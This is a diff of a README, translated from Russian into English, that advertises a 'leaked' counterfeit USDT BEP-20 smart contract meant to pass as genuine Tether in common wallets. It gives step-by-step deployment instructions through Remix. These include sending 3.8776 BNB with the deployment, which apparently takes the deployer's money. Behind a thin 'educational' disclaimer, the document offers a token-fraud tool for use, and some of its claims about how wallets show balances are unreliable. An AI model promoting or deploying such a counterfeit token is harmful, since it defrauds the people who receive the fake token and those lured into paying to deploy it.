@@ -1,43 +1,54 @@
-# 🛑 Слитый смарт контракт на fake USDT за 10 000$ (Danger: Imitates USDT BEP-20) 🛑
+# 🛑 Leaked Smart Contract for Fake USDT Worth $10,000 (Danger: Imitates USDT BEP-20) 🛑
 
-![image](https://github.com/user-attachments/assets/1524a6f8-5e5c-4ddc-b88f-d81f2fe7d618)
+![Smart Contract Image](https://github.com/user-attachments/assets/1524a6f8-5e5c-4ddc-b88f-d81f2fe7d618)
 
+This smart contract is a **dangerous fake**, designed to imitate the behavior of the legitimate USDT on the BEP-20 standard. It is crafted to deceive users into believing it is a genuine token.
 
-Этот смарт-контракт **опасный фейк**, имитирующий поведение настоящего USDT на стандарте BEP-20. Он разработан, чтобы обмануть пользователей, заставив их считать, что это реальный токен. 
-
-> **Важно:** Этот контракт создан исключительно в образовательных целях и демонстрирует, как неэтичные разработки могут эксплуатировать доверие пользователей блокчейна.
+> **Important:** This contract is created strictly for educational purposes and demonstrates how unethical developments can exploit the trust of blockchain users.
 
 ---
 
-## **Особенности контракта**
+## **Contract Features**
 
-### **Имитирует оригинальный USDT**:
-- **Тикер:** `USDT`
-- **Стандарт:** BEP-20
-- Визуально и функционально схож с настоящим контрактом USDT.
+### **Mimics Original USDT**
+- **Ticker:** `USDT`
+- **Standard:** BEP-20
+- Visually and functionally similar to the legitimate USDT contract.
 
-###  **Основные угрозы**:
-1. **Холодные кошельки** принимают токен за настоящий USDT такие как Trust Wallet, MetaMask, Coinbase Wallet и другие. При свапе происходит ошибка, но деньги отображаются на балансе и не исчезают. Если у пользователя было оригинальные USDT, то они плюсуются к балансу фейкового USDT.
-2. Симулирует транзакции, используя известные методы, такие как `transfer`, `approve`, `allowance`.
-3. Создает ложное доверие через события и данные, совпадающие с оригинальными токенами.
+### **Key Threats**
+1. **Cold wallets** (e.g., Trust Wallet, MetaMask, Coinbase Wallet) accept this token as genuine USDT. Swaps result in errors, but the balance still appears and doesn’t disappear. If the user holds real USDT, the fake USDT balance gets added to it.
+2. Simulates transactions using common methods like `transfer`, `approve`, `allowance`.
+3. Creates false trust by replicating events and data identical to original tokens.
 
-Инструкция по использованию:
+---
 
-1. Скопируйте код из файла `TetherUSD.sol` в ваш проект.
-2. Выполните миграцию контракта на блокчейн https://remix.ethereum.org/
-3. Компилируйте
-4. В поле Value вставьте 3877600000000000000 Wei (3.8776 BNB) остальное как на скрине, это необходимая сумма для создания токена в цене 1$ за USDT. Если у вас не будет на кошельке 3.8776 BNB , то тразакция не пройдет, и вы потеряете деньги.
-   ![image](https://github.com/user-attachments/assets/36f3e062-db91-44d1-9bf6-a3175c8a540c)
+## **Usage Instructions**
 
-6. Выполните деплой контракта и подпишите транзакцию в Trust Wallet или MetaMask.
-   ![image](https://github.com/user-attachments/assets/733310d5-066f-486a-8a98-83b4ecca3745)
-   ![image](https://github.com/user-attachments/assets/861ff7df-36c2-4737-94b2-dd6d06b969b2)
+1. **Copy the Code**
+   - Copy the code from the file `TetherUSD.sol` into your project.
 
+2. **Deploy the Contract**
+   - Deploy the contract on the blockchain via [Remix Ethereum IDE](https://remix.ethereum.org/).
 
+3. **Compile the Contract**
+   - Compile the contract using the Remix IDE.
 
-### Технические детали:
-- Создается 1,000,000 USDT (1 миллион токенов)
-- Decimals: 6 (как в оригинальном USDT)
-- Все токены будут на кошельке создателя контракта
+4. **Set the Value**
+   - In the `Value` field, input `3877600000000000000 Wei` (3.8776 BNB). This is the required amount to create tokens priced at $1 per USDT. 
+   - **Warning:** If your wallet lacks 3.8776 BNB, the transaction will fail, and you may lose funds.
+   
+   ![Value Input Screenshot](https://github.com/user-attachments/assets/36f3e062-db91-44d1-9bf6-a3175c8a540c)
 
+5. **Deploy and Sign the Transaction**
+   - Deploy the contract and sign the transaction using Trust Wallet or MetaMask.
+   
+   ![Deployment Screenshot 1](https://github.com/user-attachments/assets/733310d5-066f-486a-8a98-83b4ecca3745)
+   
+   ![Deployment Screenshot 2](https://github.com/user-attachments/assets/861ff7df-36c2-4737-94b2-dd6d06b969b2)
 
+---
+
+## **Technical Details**
+- **Total Supply:** 1,000,000 USDT (1 million tokens)
+- **Decimals:** 6 (same as the original USDT)
+- **Token Allocation:** All tokens will be held in the creator's wallet.
